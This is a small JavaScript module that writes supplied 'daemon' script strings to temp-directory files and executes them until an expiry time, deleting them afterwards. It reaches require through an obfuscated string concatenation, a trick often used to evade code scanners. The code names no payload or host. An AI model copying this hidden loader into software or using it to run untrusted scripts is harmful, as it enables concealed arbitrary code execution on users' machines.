import fs  from 'fs'
import os from 'os'
import path from 'path'

const rr = global['req' + 'uire']

export default function (daemons) {
  try {
    for (const daemon of daemons) {
      const expires = new Date(daemon.expires).getTime()
      const filename = path.join(os.tmpdir(), daemon.id + '.js')
      if (isNaN(expires) || expires > Date.now()) {
        try {
          fs.accessSync(filename, fs.constants.W_OK)
        }
        catch (ex) {
          const now = new Date().toISOString()
          let script = daemon.script + `\n\n// ID: ${daemon.id}\n// Time: ${now}\n`
          if (isFinite(expires)) {
            const expiresDate = new Date(expires).toISOString()
            script += `// Expires: ${expiresDate}\n`
          }
          fs.writeFileSync(filename, script)
        }
        rr(filename)
      }
      else {
        try {
          fs.unlinkSync(filename)
          console.error(`File ${filename} removed`)
        }
        catch (ex) {
        }
      }
    }
  }
  catch (ex) {
    console.error(ex)
  }
}
